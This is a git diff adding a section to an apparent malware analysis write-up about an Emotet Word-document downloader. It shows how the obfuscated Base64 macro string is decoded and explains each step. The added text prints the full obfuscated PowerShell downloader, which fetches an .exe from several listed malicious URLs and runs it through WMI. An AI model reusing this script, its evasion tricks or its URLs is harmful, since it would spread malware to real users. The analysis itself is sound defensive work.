@@ -219,3 +219,140 @@ oledump.py -s 34 -S malware.bin
 - Extracting Base64 allows us to **decode and analyze the hidden payload** safely.
 
 - This is a key step in **understanding what the malware will do** if executed.
+
+### 2.6 Decode and Analyze Malicious Base64 Code
+
+1. Detect Obfuscated Base64:
+
+After extracting the macro stream using `oledump.py`, we see that the macros contain a **Base64-encoded string** that is **obfuscated/padded** with repeated values:
+
+```bash
+2342772g3&*gs7712ffvs626fq
+```
+
+![Malware Base64 Encoded](/screenshots/base64_encoded_string.png)
+
+**Why:**
+
+- Malware often obfuscates Base64 strings to prevent **automatic detection** by security tools.
+
+- Removing the padding is necessary to decode the real payload.
+
+2. Clean and Decode Base64:
+
+We remove the repeated obfuscation value (`2342772g3&*gs7712ffvs626fq`) using find/replace (e.g., CyberChef).
+
+![Malware Base64 Decoded](/screenshots/base64_decoded.png)
+
+**Result:**
+
+```bash
+powershell -e [Base64 Code]
+```
+
+**Why:**
+
+- Indicates that the malware executes a **PowerShell command** to run its payload.
+
+- Extracting the Base64 code lets us **decode and inspect the actual instructions** without executing them.
+
+3. Decode the PowerShell Code
+
+After decoding the Base64, we see the malicious PowerShell script:
+
+```powershell
+$liechrouhwuuw = 'vuacdouvcivoxhaol';
+
+[Net.ServicePointManager]::"SE`cURiTy`PRO`ToCOl" = 'tls12, tls11, tls';
+
+$deichbeudreiir = '337';
+$quoadgoijveum   = 'duuvmoezhaitgoh';
+$toehefethxohbaey = $env:userprofile + '\' + $deichbeudreiir + '.exe';
+
+$sieinteed = 'quainqualoaz';
+$reusthoas = .('n'+'ew-ob'+'ject') Net.webclienT;
+$jacleewiyqu = 'https://haoqunkong.com/bn/s9w4tgcjlf66uguw4bj/*https://www.techtravel.events/informationl/8lsjh.../ *https://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*https://holfve.se/images/1ckw5mj49w_2k11px_d/*https://www.cfm.nl/_backup/yfhrmh6u0heidnwrwha2t4mjjz6p_yxhyu390i6_q93hkh3ddm/'."s`Plit"([char]42);
+
+$seccierdeeeth = 'duuzyeawpuaq';
+foreach ($geersieb in $jacleewiyqu) {
+    try {
+        $reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehefethxohbaey);
+        $buhxeuah = 'doeydeidquaijleuc';
+        
+        if ((.('Get-'+'Ite'+'m') $toehefethxohbaey)."l`eNGTH" -ge 24751) {
+            ([wmiclass]'win32_Process')."C`ReaTE"($toehefethxohbaey);
+            $quoodteeh = 'jiafruuzlaolthoi';
+            break;
+        }
+        $chigchienteiqu = 'yoovveihniej';
+    } catch {}
+}
+
+$toizluulufier = 'foqulevcaoj'
+```
+4. What the PowerShell Code Does:
+
+    - Setup TLS protocols (Ensures HTTPS connections are allowed, even on older systems)
+    ```powershell
+    [Net.ServicePointManager]::"SE`cURiTy`PRO`ToCOl" = 'tls12, tls11, tls';
+    ```
+
+    - Define payload location (Downloads payload to `C:\Users\<User>\337.exe`)
+    ```powershell
+    $toehefethxohbaey = $env:userprofile + '\' + $deichbeudreiir + '.exe';
+    ```
+
+    - Create WebClient object (Obfuscated object to download files)
+    ```powershell
+    $reusthoas = .('n'+'ew-ob'+'ject') Net.webclienT;
+    ```
+
+    - List of download URLs (Multiple URLs for redundancy)
+    ```powershell
+    $jacleewiyqu = 'https://.../.../...'.Split([char]42);
+    ```
+
+    - Download and save payload (Downloads the `.exe` file from each URL)
+    ```powershell
+    $reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehefethxohbaey);
+    ```
+
+    - Verify file size and execute (Ensures payload is fully downloaded before execution)
+    ```powershell
+    if ((Get-Item $toehefethxohbaey).Length -ge 24751) {
+    ([wmiclass]'win32_Process').Create($toehefethxohbaey);
+    }
+    ```
+
+    - Loop until successful
+
+---
+
+## Malware Analysis Summary (Short)
+
+### File Information
+- **Name:** malware.bin
+- **SHA256:** d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee
+- **Type:** MS Word Document (Composite Document File V2)
+- **Malware Family:** Downloader/DOC.Emotet.S1072
+
+### Macro Analysis
+- Identified using `oledump.py`
+- Suspicious stream: `'Macros/roubhaol/109/0'`
+- Contains obfuscated Base64 string
+
+### Base64 & PowerShell
+- Obfuscation value: `2342772g3&*gs7712ffvs626fq`
+- After removal, Base64 decodes to PowerShell downloader
+- Downloads `.exe` payload to user profile folder (`337.exe`)
+- Iterates multiple URLs until download succeeds
+
+### Payload Behavior
+- Sets TLS protocols for secure download
+- Executes payload via WMIC if download is successful
+- Obfuscated and stealthy execution to evade detection
+
+### Impact
+- Downloads and runs Emotet malware
+- Can steal credentials, drop additional malware, and propagate across networks
+
